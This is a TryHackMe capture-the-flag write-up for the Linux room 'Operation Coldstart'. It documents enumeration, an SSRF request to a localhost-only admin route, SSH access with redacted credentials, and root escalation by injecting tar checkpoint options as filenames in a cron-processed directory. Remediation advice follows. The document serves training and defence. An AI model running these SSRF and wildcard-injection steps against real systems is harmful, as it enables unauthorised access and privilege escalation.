# Operation Coldstart Challenge

*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Jr Pentester Challenges* | **Challenge:** *[Operation Coldstart](https://tryhackme.com/room/operationcoldstart)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **13 July 2026**.
>
> **Spoiler warning:** This write-up documents the exploitation chain, although credentials, exact challenge-specific values and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
>: `<TARGET_IP>` represents the IP address allocated to the target machine.
>: `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
>: `<REDACTED>` represents credentials, internal hostnames, sensitive file contents, exact exploit values or other challenge giveaways.
>: `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security.

Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Operation Coldstart is a Linux-based penetration-testing challenge centred on an abandoned staging server belonging to the fictional Volt Labs organisation.

The objective was to enumerate the exposed services, identify a route into the staging application, obtain an initial user foothold and escalate privileges to root.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating FTP, SSH and HTTP services.
3. Accessing an anonymously readable FTP share.
4. Downloading and reviewing an exposed application backup.
5. Identifying a server-side request forgery weakness in the recovered Flask source code.
6. Using the vulnerable preview feature to reach a localhost-only administrative route.
7. Recovering redacted SSH credentials from an internal note.
8. Logging in as a local Linux user and reading `user.txt`.
9. Identifying a root-owned cron job that invoked GNU `tar` with a wildcard inside a writable directory.
10. Exploiting wildcard argument injection to create a SUID-enabled Bash binary.
11. Launching Bash with preserved privileges and reading the final root flag.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: operation-coldstart.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> operation-coldstart.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts operation-coldstart.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address.

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti: technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/operation-coldstart\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `rustscan` and `nmap` for TCP port, service and script enumeration.
- `gobuster`, `dirsearch` and `feroxbuster` for web content discovery.
- FTP for anonymous file-share access.
- Firefox for interacting with the web application.
- `tar` for extracting the downloaded application backup.
- `cat`, `ls`, `find` and other standard Linux utilities for file inspection.
- cURL for interacting with the web application and testing the preview endpoint.
- NetExec for validating recovered SSH credentials.
- OpenSSH for obtaining a stable interactive shell.
- GNU `tar` checkpoint behaviour for demonstrating wildcard argument injection.

Click [HERE](https://github.com/Valikahn/TryHackMe-Jr-Penetration-Tester#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A rapid scan was performed first:

```bash
rustscan -b 500 -a operation-coldstart.thm --top -- -sC -sV -Pn
```

A full TCP scan was then used to confirm that no additional services were exposed:

```bash
nmap -p- -sC -sV --min-rate 3000 operation-coldstart.thm
```

The principal findings were:

```text
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Service detection identified:

```text
FTP:  vsftpd
SSH:  OpenSSH on Ubuntu
HTTP: Gunicorn
```

Nmap also reported that anonymous FTP authentication was permitted.

### Web Content Discovery

The HTTP service presented a Volt Labs URL preview application.

Gobuster identified two notable routes:

```bash
gobuster dir \
  -u http://operation-coldstart.thm/ \
  -w /usr/share/wordlists/dirb/big.txt
```

Relevant results included:

```text
/admin/
/preview
```

Direct access to `/admin/` returned `403 Forbidden`, while `/preview` returned an error explaining that a `url` parameter was required.

Additional enumeration with Dirsearch and Feroxbuster confirmed the same principal routes. The large number of `403` responses beneath `/admin/` did not represent individually confirmed files; they were generated by the application's broad route handling.

### Anonymous FTP Enumeration

Anonymous authentication was tested:

```bash
ftp operation-coldstart.thm
```

The username used was:

```text
anonymous
```

A readable `pub` directory contained an application backup:

```text
backup.tar.gz
```

The archive was downloaded using the FTP client:

```text
cd pub
ls
get backup.tar.gz
exit
```

The backup was extracted locally:

```bash
tar xfs backup.tar.gz
```

The extracted project contained:

```text
app.py
README.md
requirements.txt
```

### Reviewing the Recovered Flask Application

The application source was reviewed:

```bash
cat voltlabs-preview/app.py
```

The recovered source code disclosed several important design decisions that shaped the next stage of the assessment:

- The /preview route accepted a URL supplied directly by the user through a query parameter. This meant the application was responsible for making the outbound request rather than the visitor's browser.
- The application attempted to reduce risk by allowing requests to only one approved internal hostname. However, this control focused solely on the hostname and did not fully validate the destination.
- The URL scheme and requested path were not restricted. As a result, once the approved hostname was accepted, the application could still be directed towards different locations hosted beneath that same internal service.
- The application used Python's requests library to retrieve the supplied URL. This confirmed that the request originated from the target server itself, which was significant when considering services or routes that trusted local traffic.
- Administrative routes were protected only by checking whether the connecting source address began with 127.. This was a weak trust decision because it treated all loopback-originating requests as authorised without requiring authentication.
- A separate notes route read the contents of an internal text file from disk and returned it in the HTTP response. Although the file's contents were not visible externally, the route became important because the source code revealed both its existence and how access to it was controlled.

Taken together, these design choices suggested that the URL preview feature might be capable of reaching content that was inaccessible through a normal external request. The weakness was therefore not caused by one issue alone, but by the combination of incomplete URL validation, server-side request handling and excessive trust in localhost traffic.

The exact approved hostname has been redacted:

```python
ALLOWED_HOSTS = {"<REDACTED>"}
```

The source comment stated that this hostname resolved to `127.0.0.1` on the target server. This created a direct route to the otherwise localhost-only administrative endpoint.

## Exploits

### Server-Side Request Forgery

The preview feature performed server-side HTTP requests to the approved hostname.

A basic request confirmed that the application would fetch content from that internal name:

```bash
curl \
  "http://operation-coldstart.thm/preview?url=http://<REDACTED>/"
```

The response contained the internally fetched web page inside the preview output.

The administrative notes route was then requested through the same feature:

```bash
curl \
  "http://operation-coldstart.thm/preview?url=http://<REDACTED>/admin/notes"
```

Because the request originated from the Flask application itself, the administrative route saw the source as localhost and allowed access.

The response disclosed staging SSH access details:

```text
user: <REDACTED>
pass: <REDACTED>
```

The exact credentials are intentionally omitted.

### Validating SSH Credentials

The recovered credentials were validated with NetExec:

```bash
nxc ssh operation-coldstart.thm \
  -u <REDACTED> \
  -p '<REDACTED>'
```

The result confirmed valid Linux shell access.

A stable SSH session was then opened:

```bash
ssh <REDACTED>@operation-coldstart.thm
```

### User Flag

The remote session opened in the compromised user's home directory.

The current identity and location were confirmed:

```bash
id
pwd
```

The user flag was read with:

```bash
cat ~/user.txt
```

The result is intentionally redacted:

```text
THM{....}
```

### Cron Job Enumeration

Local enumeration identified a custom cron configuration:

```bash
cat /etc/cron.d/voltlabs-backup
```

The relevant root-owned task was:

```cron
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

This command was unsafe because:

- It ran as `root`.
- It changed into `/opt/backups`.
- The directory was writable by the compromised user.
- The unquoted wildcard was expanded by the shell.
- Filenames beginning with `--` could therefore be interpreted by GNU `tar` as command-line options.

### GNU Tar Wildcard Argument Injection

A small script was created inside the writable backup directory:

```bash
cd /opt/backups
echo '<REDACTED>' > shell.sh
```

The script's purpose was to create a privileged Bash binary in `/tmp`. Its exact contents are redacted because they provide the final challenge-specific privilege-escalation payload.

Two specially named files were then created:

```bash
touch -- '--checkpoint=<REDACTED>'
touch -- '--checkpoint-action=<REDACTED>'
```

When the cron job later expanded `*`, GNU `tar` interpreted these filenames as checkpoint options and executed the supplied action as root.

After the next cron interval, the privileged binary appeared in `/tmp`.

Its presence and permissions were checked with:

```bash
ls -l /tmp/<REDACTED>
```

### Root Shell

The created Bash binary was launched while preserving its effective privileges:

```bash
/tmp/<REDACTED> -p
```

The resulting identity was checked:

```bash
id
```

The important result was an effective user ID of root:

```text
euid=0(root)
```

The final flag was then read:

```bash
cat /root/flag.txt
```

The result is intentionally redacted:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The allocated target and `tun0` addresses were confirmed. The room hostname was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that the web application was accessed through its expected hostname.

### 2. Service Discovery
RustScan and Nmap identified FTP, SSH and HTTP. Anonymous FTP access was enabled, and the web service was hosted by Gunicorn.

### 3. Web Enumeration
Directory discovery identified `/admin/` and `/preview`. Direct access to the administrative route was forbidden, while the preview route required a URL parameter.

### 4. Anonymous FTP Access
The FTP `pub` directory contained `backup.tar.gz`. Anonymous users could download this archive without credentials.

### 5. Source-Code Disclosure
Extracting the archive revealed the Flask application source. Reviewing `app.py` exposed the approved internal hostname, the server-side request behaviour and the localhost-only administrative routes.

### 6. SSRF Exploitation
The `/preview` route was supplied with a URL pointing to the approved internal hostname. The target server fetched the URL on the attacker's behalf.

### 7. Localhost Access-Control Bypass
The server-side request reached `/admin/notes` from a loopback address. This satisfied the application's weak source-IP check and returned the internal administrative notes.

### 8. Credential Disclosure
The notes contained valid SSH access details for a local staging user. The username and password are redacted from this public write-up.

### 9. SSH Foothold
The recovered credentials were validated and used to establish an interactive SSH session. The first flag was obtained from the user's home directory:

```text
THM{....}
```

### 10. Privilege-Escalation Discovery
A root cron job archived every entry in `/opt/backups` using GNU `tar` and an unquoted wildcard. The working directory was writable by the compromised user.

### 11. Wildcard Argument Injection
Files beginning with GNU `tar` checkpoint options were placed in the directory. During wildcard expansion, the filenames became command-line arguments and caused a root-level action to execute.

### 12. Privileged Bash Binary
The cron-executed action created a SUID-enabled Bash binary in `/tmp`. Launching it with privilege preservation produced a shell with an effective UID of root.

### 13. Final Objective
Root access allowed `/root/flag.txt` to be read, completing the room:

```text
THM{....}
```

## Key Lessons

Operation Coldstart demonstrated several useful penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting application behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali VM for TryHackMe rooms.
- Anonymous FTP shares should always be enumerated carefully.
- Small backup archives can disclose more than large public directories.
- Source-code review often reveals assumptions that are invisible from the user interface.
- Hostname allow-lists do not prevent SSRF when the permitted name resolves to localhost.
- Restricting access by source IP alone is weak when another server-side function can issue local requests.
- Internal notes should never contain reusable credentials.
- Credentials recovered from one service should be validated carefully against the most appropriate remote-access service.
- Custom cron jobs deserve immediate attention during Linux privilege-escalation enumeration.
- Wildcards used by privileged commands can turn attacker-controlled filenames into command-line arguments.
- Writable directories must never be processed by root with unsafe wildcard expansion.
- Effective UID should be checked after privilege escalation to prove that root access was genuinely obtained.
- Public write-ups should document the method without publishing live credentials, exact flags or unnecessary challenge giveaways.

The most important operational lesson was that the initial web route could not be fully understood from external testing alone. Anonymous FTP exposed the source code, and that source code explained how the restricted administrative endpoint could be reached.

## Remediation Notes

### FTP and Backup Security

- Disable anonymous FTP access unless there is a documented operational requirement.
- Remove sensitive application backups from publicly readable shares.
- Store backups outside web roots and anonymous file-transfer locations.
- Encrypt backups containing source code, configuration or credentials.
- Apply strict ownership and permissions to all deployment archives.
- Monitor anonymous downloads and unexpected access to backup files.
- Review backup contents before publication or transfer.

### SSRF Prevention

- Avoid accepting arbitrary URLs from untrusted users.
- Use a strict allow-list covering scheme, hostname, port and path.
- Resolve the hostname before making the request and reject loopback, private, link-local and reserved addresses.
- Revalidate the destination after every redirect.
- Disable redirects unless they are explicitly required.
- Restrict outbound traffic from the web service using host-level or network-level controls.
- Use a dedicated proxy with an explicit destination policy for server-side fetching.
- Return only the minimum required response data to the client.

### Administrative Access Controls

- Do not rely exclusively on `request.remote_addr` for administrative authorisation.
- Require strong authentication and role-based authorisation for every administrative route.
- Separate administrative services onto a dedicated interface or network.
- Apply defence in depth so that a server-side request cannot inherit administrative trust.
- Remove sensitive operational notes from web-accessible endpoints.
- Log and alert on access to internal administration routes.

### Credential Management

- Never store reusable passwords in plaintext notes.
- Use a secrets-management system for service and deployment credentials.
- Rotate credentials immediately if they appear in backups or administrative files.
- Prevent password reuse across application, SSH and administrative accounts.
- Prefer key-based SSH authentication over passwords.
- Apply multi-factor authentication where practical.
- Restrict SSH access to trusted networks or VPN ranges.

### Cron and Privilege Management

- Do not run `tar` with an unquoted wildcard in a directory writable by unprivileged users.
- Use an explicit file list or a trusted absolute source path.
- Insert `--` before file operands where supported to stop option parsing.
- Ensure root-owned cron working directories are not writable by ordinary users.
- Use restrictive ownership and permissions on scripts executed by cron.
- Avoid placing privileged output in world-writable directories such as `/tmp`.
- Regularly audit `/etc/cron.d`, system-wide crontabs and scheduled scripts.
- Monitor for filenames beginning with `--` in directories processed by privileged utilities.
- Mount temporary directories with appropriate hardening options where operationally possible.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale challenge entries after each room.
- Maintain separate working directories for scan output, downloaded files and evidence.
- Record target, hostname and `tun0` details at the beginning of each engagement.
- Validate each stage of an attack chain before moving to the next.

## Disclaimer

This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
